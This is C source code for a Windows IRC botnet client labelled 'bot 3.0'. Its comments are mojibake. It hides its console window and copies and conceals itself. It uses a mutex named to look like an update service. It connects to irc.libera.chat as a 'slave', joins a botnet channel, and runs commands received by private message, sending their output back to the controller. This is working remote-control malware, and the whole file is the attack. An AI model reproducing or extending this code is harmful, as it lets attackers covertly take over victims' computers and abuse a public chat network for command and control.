#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include "header.h"

HANDLE hMutex;

BOOL is_already_running() {
    // ʹ�� Mutex ��ֹ�ظ�����
    hMutex = CreateMutexW(NULL, FALSE, L"Global\\UpdateServiceMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        bot_log("[!] Another instance is already running.\n");
        return TRUE;
    }
    return FALSE;
}


const char* version = "bot 3.0";
MessageBuffer msgBuffer;
SOCKET ircsock;
 
int main(int argc, char* argv[]) {

    if (!DEBUG) {
        HWND hwnd = GetConsoleWindow();  
        if (hwnd) {
            ShowWindow(hwnd, SW_HIDE);   // ���ش���
        }
    }


    init_log_path();
    bot_log("version :%s",version);




    if (!is_hidden_bot() && HIDE_ON_ENTRY) {
        bot_log("Starting to hide myself...\n");
        copy_and_hide_bot();
        WSACleanup();
        return 0;
    }
    else {
        bot_log("Is hidden process, starting to run...\n");
    }

    if (is_already_running())
        exit(0);

    const char* owner = "#mybotnet123123";
    const char* channel = "#mybotnet123123";
    int reconnectAttempts = 0;

    while (reconnectAttempts <= MAX_RECONNECT_ATTEMPTS) {
        ircsock = TCPhandler("irc.libera.chat", "slave");
        if (ircsock == INVALID_SOCKET) {
            bot_log("Failed to connect to IRC server. Attempt %d of %d...\n",
                reconnectAttempts + 1, MAX_RECONNECT_ATTEMPTS);
            reconnectAttempts++;
            Sleep(RECONNECT_INTERVAL);
            continue;
        }

        // �Զ�����Ƶ��
        
        char joinCmd[128];
        snprintf(joinCmd, sizeof(joinCmd), "JOIN %s\r\n", channel);
        send(ircsock, joinCmd, (int)strlen(joinCmd), 0);
        bot_log("[+] Joined channel: %s\n", channel);


        char buf[DEFAULT_BUFLEN];


        //snprintf(buf, sizeof(buf), "PRIVMSG %s :Bot is online!\r\n", owner);
        //appendToBuffer(&msgBuffer, ircsock, buf);
        //snprintf(buf, sizeof(buf), "AppData PATH : %s", appdata_path);
        //appendToBuffer(&msgBuffer, ircsock, buf);
        //snprintf(buf, sizeof(buf), "CodePage : %u", GetACP());
        //appendToBuffer(&msgBuffer, ircsock, buf);
        //flushBuffer(&msgBuffer, ircsock);

        while (1) {
            int n = recv(ircsock, buf, sizeof(buf) - 1, 0);
            if (n <= 0) {
                bot_log("Connection closed by server.\n");
                closesocket(ircsock);
                break;
            }

            buf[n] = '\0';  // Null-terminate




            // ���� PING/PONG
            if (strncmp(buf, "PING", 4) == 0) {
                char pong[512];
                snprintf(pong, sizeof(pong), "PONG%s\r\n", buf + 4);
                send(ircsock, pong, (int)strlen(pong), 0);
                continue;
            }

            // ���� PRIVMSG
            char* privmsg = strstr(buf, "PRIVMSG");
            if (privmsg != NULL) {

                // ������Ϣ������ʼλ�ã���һ�� ':' ��
                char* colon = strchr(privmsg, ':');
                if (colon != NULL) {
                    char* command = colon + 1;

                    // ������UTF-8תANSIת��
                    char ansiCommand[DEFAULT_BUFLEN]; // ȷ���㹻��Ļ�����
                    int res = Utf8ToAnsi(command, ansiCommand, sizeof(ansiCommand));
                    if (res < 0) {
                        bot_log("Error converting UTF-8 to ANSI: %d\n", res);
                        continue; // ת��ʧ�ܣ�����������
                    }

                    // ��ת�����ANSI�ַ�������ԭʼcommand
                    command = ansiCommand;


                    // ȥ��ǰ��հ��ַ�
                    char* end = command + strlen(command);
                    while (end > command && (*(end - 1) == '\r' || *(end - 1) == '\n' || *(end - 1) == ' '))
                        end--;
                    *end = '\0';

                    // ��ʼ����Ϣ������
                    initMessageBuffer(&msgBuffer, owner);

                    bot_log("Received Command:\n%s\n", command);

                    // ������ִ������
                    ParsedCommand parsedCmd = parsecommand(command);
                    char* result = execute_parsed_command(parsedCmd, ircsock);

                    if (result) {
                        char* resultCopy = strdup(result);
                        char* token;
                        char* context = NULL;
                        token = strtok_s(resultCopy, "\n", &context);

                        while (token != NULL) {
                            appendToBuffer(&msgBuffer, ircsock, token);
                            token = strtok_s(NULL, "\n", &context);
                        }

                    
                        flushBuffer(&msgBuffer, ircsock);

                        free(resultCopy);
                        free(result);
                    }
                }
            }

            memset(buf, 0, sizeof(buf));
        }

        reconnectAttempts++;
        if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
            bot_log("Reconnecting in %d seconds...\n", RECONNECT_INTERVAL / 1000);
            Sleep(RECONNECT_INTERVAL);
        }
    }

    WSACleanup();
    return 0;
}